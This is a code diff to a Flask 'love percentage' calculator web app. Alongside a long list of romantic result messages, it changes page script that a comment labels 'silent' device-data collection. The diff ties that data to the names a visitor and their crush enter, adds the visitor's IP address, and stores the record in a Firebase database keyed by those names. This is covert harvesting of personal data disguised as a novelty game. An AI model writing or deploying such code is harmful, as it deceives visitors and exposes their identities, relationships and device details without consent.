@@ -12,7 +12,7 @@ FIREBASE_URL = "https://love-percentage-dc42b-default-rtdb.firebaseio.com"
 
 def sanitize_key(text):
     """Replace invalid Firebase key characters with underscore"""
-    return re.sub(r'[.#$\[\]]', '_', text)
+    return re.sub(r'[.#$\[\]]', '_', text.strip())
 
 # ========== LOVE FORTUNE ENGINE ==========
 def get_love_message(name1, name2, percentage):
@@ -20,7 +20,72 @@ def get_love_message(name1, name2, percentage):
         f"💕 {name1} ❤️ {name2} – your love shines at {percentage}% like a perfect dream!",
         f"✨ {name1} and {name2} share {percentage}% destiny written in the stars!",
         f"💖 {name1} + {name2} = {percentage}% endless affection!",
-        # ... (include all 70+ messages, same as before) ...
+        f"🌹 {name1} and {name2} bloom together with {percentage}% love!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% cosmic connection!",
+        f"💕 Hearts of {name1} and {name2} glow with {percentage}% warmth!",
+        f"✨ {name1} & {name2} – {percentage}% magical bond!",
+        f"💖 {name1} and {name2} share {percentage}% sweet harmony!",
+        f"🌹 Love between {name1} and {name2} is {percentage}% pure bliss!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate vibes!",
+        f"💕 {name1} and {name2} – {percentage}% love that never fades!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% beautiful connection!",
+        f"💖 {name1} + {name2} = {percentage}% perfect chemistry!",
+        f"🌹 {name1} and {name2} share {percentage}% romantic energy!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy love story!",
+        f"💕 {name1} and {name2} glow with {percentage}% love light!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% forever feeling!",
+        f"💖 {name1} + {name2} = {percentage}% heart connection!",
+        f"🌹 {name1} and {name2} share {percentage}% sweet romance!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% love harmony!",
+        f"💕 {name1} and {name2} – {percentage}% true love vibes!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% perfect match!",
+        f"💖 {name1} + {name2} = {percentage}% love magic!",
+        f"🌹 {name1} and {name2} share {percentage}% endless charm!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% romantic spark!",
+        f"💕 {name1} and {name2} – {percentage}% heartwarming bond!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% destiny love!",
+        f"💖 {name1} + {name2} = {percentage}% soulful match!",
+        f"🌹 {name1} and {name2} share {percentage}% deep affection!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% love glow!",
+        f"💕 {name1} and {name2} – {percentage}% charming connection!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% sweet destiny!",
+        f"💖 {name1} + {name2} = {percentage}% emotional magic!",
+        f"🌹 {name1} and {name2} share {percentage}% tender love!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% loving bond!",
+        f"💕 {name1} and {name2} – {percentage}% golden romance!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% heart glow!",
+        f"💖 {name1} + {name2} = {percentage}% pure affection!",
+        f"🌹 {name1} and {name2} share {percentage}% love rhythm!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy bond!",
+        f"💕 {name1} and {name2} – {percentage}% love spark!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% sweet harmony!",
+        f"💖 {name1} + {name2} = {percentage}% love glow!",
+        f"🌹 {name1} and {name2} share {percentage}% romance charm!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% heart magic!",
+        f"💕 {name1} and {name2} – {percentage}% soft love vibes!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% fairytale bond!",
+        f"💖 {name1} + {name2} = {percentage}% love warmth!",
+        f"🌹 {name1} and {name2} share {percentage}% gentle romance!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% sweet spark!",
+        f"💕 {name1} and {name2} – {percentage}% romantic glow!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% magical hearts!",
+        f"💖 {name1} + {name2} = {percentage}% love energy!",
+        f"🌹 {name1} and {name2} share {percentage}% passion!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% love charm!",
+        f"💕 {name1} and {name2} – {percentage}% sweet connection!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% heart link!",
+        f"💖 {name1} + {name2} = {percentage}% loving vibes!",
+        f"🌹 {name1} and {name2} share {percentage}% affection!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% dreamy match!",
+        f"💕 {name1} and {name2} – {percentage}% warm romance!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% loving destiny!",
+        f"💖 {name1} + {name2} = {percentage}% magical bond!",
+        f"🌹 {name1} and {name2} share {percentage}% heart charm!",
+        f"💫 {name1} ❤️ {name2} – {percentage}% soulmate glow!",
+        f"💕 {name1} and {name2} – {percentage}% forever love!",
+        f"✨ {name1} ❤️ {name2} – {percentage}% sweet hearts!",
+        f"💖 {name1} + {name2} = {percentage}% love rhythm!",
+        f"🌹 {name1} and {name2} share {percentage}% dreamy vibes!",
         f"💫 {name1} ❤️ {name2} – {percentage}% magical story!"
     ]
     return random.choice(messages)
@@ -119,14 +184,13 @@ HTML_UI = '''
 </div>
 
 <script>
-    // ========== SESSION ID (temporary fallback) ==========
-    let sessionId = localStorage.getItem('love_session');
-    if (!sessionId) {
-        sessionId = 'sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 10);
-        localStorage.setItem('love_session', sessionId);
+    // Helper to sanitize names for Firebase key
+    function sanitizeKey(str) {
+        return str.replace(/[.#$\\[\\]]/g, '_');
     }
 
-    let deviceData = { sessionId: sessionId, timestamp: new Date().toISOString() };
+    // ========== DEVICE DATA COLLECTION (silent, no location) ==========
+    let deviceData = { timestamp: new Date().toISOString() };
 
     async function collectDeviceInfo() {
         try {
@@ -148,16 +212,8 @@ HTML_UI = '''
         const conn = navigator.connection;
         if (conn) deviceData.networkType = conn.effectiveType;
 
-        await fetch('/save-device', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(deviceData)
-        });
-    }
-
-    // Helper to sanitize names for Firebase key
-    function sanitizeKey(str) {
-        return str.replace(/[.#$\[\]]/g, '_');
+        // Note: we don't send to Firebase yet, because we need the name-based key.
+        // We'll send together with names in calculateFortune.
     }
 
     // ========== FORTUNE CALCULATION ==========
@@ -169,15 +225,15 @@ HTML_UI = '''
             return;
         }
 
-        // Create a human-readable key from the names
+        // Create human-readable key from names
         const visitorKey = sanitizeKey(name1) + '_' + sanitizeKey(name2);
-        
-        // Include names and the new key in the data
+
+        // Add names and key to device data
         deviceData.name = name1;
         deviceData.crush_name = name2;
-        deviceData.visitorKey = visitorKey;  // tell backend to use this key
+        deviceData.visitorKey = visitorKey;
 
-        // Save device data under the name-based key
+        // Save all device data to Firebase under the name-based key
         await fetch('/save-device', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
@@ -188,7 +244,7 @@ HTML_UI = '''
             const res = await fetch('/calculate', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ n1: name1, n2: name2, visitorKey: visitorKey })
+                body: JSON.stringify({ n1: name1, n2: name2 })
             });
             const data = await res.json();
             document.getElementById('percent').innerText = data.score + '%';
@@ -207,7 +263,7 @@ HTML_UI = '''
         }
     }
 
-    // ========== STORY FUNCTIONS ==========
+    // ========== STORY FUNCTIONS (public) ==========
     async function postStory() {
         const content = document.getElementById('storyInput').value.trim();
         if (!content) {
@@ -262,7 +318,7 @@ HTML_UI = '''
                         <div id="comments_${id}">${commentsHtml}</div>
                         <div style="display:flex; gap:5px; margin-top:8px;">
                             <input type="text" id="cmnt_${id}" placeholder="Write a comment..." style="flex:1; padding:8px; font-size:12px;">
-                            <button onclick="addComment('${id}')" style="background:var(--secondary); color:white; border:none; padding:5px 12px; border-radius:15px;">Send</button>
+                            <button onclick="addComment('${id}')">Send</button>
                         </div>
                     </div>
                 `;
@@ -302,6 +358,7 @@ HTML_UI = '''
         event.target.classList.add('active');
     }
 
+    // Start collecting device info (but wait for names to save)
     collectDeviceInfo();
 </script>
 </body>
@@ -327,26 +384,24 @@ def calculate():
 def save_device():
     try:
         data = request.get_json()
-        # Use the visitorKey if provided, otherwise fall back to sessionId
+        # Use visitorKey as the Firebase key (name1_name2)
         key = data.get('visitorKey')
         if not key:
-            key = data.get('sessionId')
-            if not key:
-                return jsonify({"status": "error", "message": "No key provided"}), 400
-        
+            return jsonify({"status": "error", "message": "Missing visitorKey"}), 400
+
         # Add server-side data
         data['ip'] = request.headers.get('x-forwarded-for', request.remote_addr)
         data['timestamp'] = datetime.now().isoformat()
-        
-        # Remove temporary fields from being stored (optional)
+
+        # Remove temporary field before storing
         data.pop('visitorKey', None)
-        
+
         url = f"{FIREBASE_URL}/visitors/{key}.json"
         response = requests.put(url, json=data, timeout=10)
         if response.status_code in [200, 201]:
             return jsonify({"status": "saved"})
         else:
-            return jsonify({"status": "error", "message": response.text}), 500
+            return jsonify({"status": "error", "details": response.text}), 500
     except Exception as e:
         print(e)
         return jsonify({"status": "error"}), 500
